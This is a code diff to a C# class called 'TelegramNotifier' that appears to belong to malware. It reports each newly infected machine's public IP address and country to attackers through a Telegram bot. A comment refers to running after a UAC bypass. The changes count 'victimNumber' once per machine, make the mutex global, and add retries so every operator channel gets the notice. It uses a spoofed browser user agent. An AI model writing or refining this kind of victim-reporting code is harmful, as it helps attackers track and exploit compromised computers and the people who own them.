@@ -51,7 +51,7 @@ internal static class TelegramNotifier
 
     // Session-local mutex: serialises concurrent instances (e.g. user + admin after UAC
     // bypass) so only one sends the notification even when both race past ShouldNotify().
-    private static readonly string _mutexName = $"Sero_tg_{GetHwidShort()}";
+    private static readonly string _mutexName = $@"Global\Sero_tg_{GetHwidShort()}";
 
     private static bool ShouldNotify()
     {
@@ -212,9 +212,10 @@ internal static class TelegramNotifier
                 http.DefaultRequestHeaders.UserAgent.ParseAdd(
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
 
-                int victimNumber = IncrementAndGetCounter();
                 var (pubIp, country) = await GetPublicInfoAsync(http);
-                var msg = BuildMessage(pubIp, country, victimNumber);
+                int victimNumber = 0;
+                bool counted = false;
+                string msg = "";
 
                 bool primarySent = false;
                 for (int attempt = 0; attempt < 6 && !primarySent; attempt++)
@@ -222,12 +223,22 @@ internal static class TelegramNotifier
                     try
                     {
                         if (attempt > 0) await Task.Delay(2000);
+                        if (!counted) { victimNumber = IncrementAndGetCounter(); counted = true; msg = BuildMessage(pubIp, country, victimNumber); }
                         await SendMessage(http, token, targets[0], msg);
                         primarySent = true;
                         MarkNotified();
                         for (int i = 1; i < targets.Count; i++)
                         {
-                            try { await SendMessage(http, token, targets[i], msg); } catch { }
+                            for (int retry = 0; retry < 3; retry++)
+                            {
+                                try
+                                {
+                                    if (retry > 0) await Task.Delay(2000);
+                                    await SendMessage(http, token, targets[i], msg);
+                                    break;
+                                }
+                                catch { }
+                            }
                         }
                     }
                     catch { }
